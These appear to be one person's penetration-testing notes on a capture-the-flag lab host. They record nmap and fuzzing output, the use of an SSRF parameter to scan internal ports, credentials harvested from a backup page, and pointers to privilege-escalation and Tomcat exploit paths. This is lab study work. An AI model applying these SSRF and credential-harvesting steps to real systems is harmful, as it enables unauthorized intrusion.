============== Enumeration ==============

Nmap (nmap -p 22,8009,8080,60000 -sC -sV 10.10.10.55)
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5 - Error report
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title:         Kotarak Web Hosting        
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

ffuf (port 60000)
```bash
ffuf -u 'http://10.10.10.55:60000/FUZZ' -w raft-large-words.txt -e .php --fc 403

index.php               [Status: 200, Size: 1169, Words: 226, Lines: 77]
info.php                [Status: 200, Size: 92360, Words: 4592, Lines: 1110]
.                       [Status: 200, Size: 1169, Words: 226, Lines: 77]
url.php                 [Status: 200, Size: 2, Words: 1, Lines: 3]

```

ffuf (port 8080)
```bash
ffuf -u 'http://10.10.10.55:8080/FUZZ' -w raft-large-words.txt 

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1]
```

ffuf (abusing ssrf)
```bash
ffuf -u 'http://10.10.10.55:60000/url.php?path=http://localhost:8009/FUZZ' -w raft-large-words.txt -e .php,.txt,.html --fw 1,2

DIDNT FIND ANYTHING!!!
```

wfuzz (abusing ssrf for port scanning)
```bash
wfuzz -u 'http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ' -z range,0-65535 --hw 0

000000023:   200        4 L      4 W        62 Ch       "22"                                       
000000091:   200        11 L     18 W       156 Ch      "90"                                       
000000111:   200        17 L     24 W       187 Ch      "110"                                      
000000201:   200        3 L      2 W        22 Ch       "200"                                      
000000321:   200        26 L     109 W      1232 Ch     "320"                                      
000000889:   200        78 L     265 W      3955 Ch     "888"                                      
000003307:   200        2 L      5 W        123 Ch      "3306"                                     
000008081:   200        2 L      47 W       994 Ch      "8080"                                     
000060001:   200        78 L     130 W      1171 Ch     "60000"                       
```

============== Enumeration End ==============

============== Credentials ==============

From http://10.10.10.55:60000/url.php?path=http://localhost:888?doc=backup:
	admin:3@g01PdhB!
	atanas:f16tomcat! OR Password123!


============== Credentials End ==============

For privesc:
	/var/tmp/mkinitramfs_CAAb2h/bin/ntfs-3g 

phpinfo (http://10.10.10.55:60000/info.php):
	disabled functions :
	
Weird IP:
	10.0.3.133
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority

	
Tomcat exploit (could be useful once logged into interface):
	jsp/webapps/42966.py

